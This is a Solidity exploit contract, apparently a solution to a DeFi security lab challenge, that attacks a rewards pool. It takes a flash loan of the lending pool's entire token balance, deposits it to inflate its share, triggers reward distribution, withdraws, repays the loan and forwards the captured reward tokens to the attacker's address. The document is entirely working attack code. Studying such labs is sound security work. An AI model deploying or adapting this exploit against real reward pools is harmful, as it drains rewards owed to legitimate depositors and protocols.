// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFLPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint);
}

contract AttackReward {
    address immutable player;
    IERC20 private immutable liquidityTokne;
    IERC20 private immutable rewardToken;
    IFLPool private immutable lendingPool;
    IRewardPool private immutable rewardsPool;

    constructor(
        address _rewardsPool,
        address _lendingPool,
        address _liquidityTokne,
        address _rewardToken
    ) {
        player = msg.sender;
        liquidityTokne = IERC20(_liquidityTokne);
        rewardToken = IERC20(_rewardToken);
        lendingPool = IFLPool(_lendingPool);
        rewardsPool = IRewardPool(_rewardsPool);
    }

    function attack() external {
        uint balance = liquidityTokne.balanceOf(address(lendingPool));
        lendingPool.flashLoan(balance);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityTokne.approve(address(rewardsPool), amount);
        rewardsPool.deposit(amount);
        rewardsPool.withdraw(amount);
        rewardsPool.distributeRewards();
        liquidityTokne.transfer(address(lendingPool), amount);
        uint tokens = rewardToken.balanceOf(address(this));
        rewardToken.transfer(address(player), tokens);
    }
}
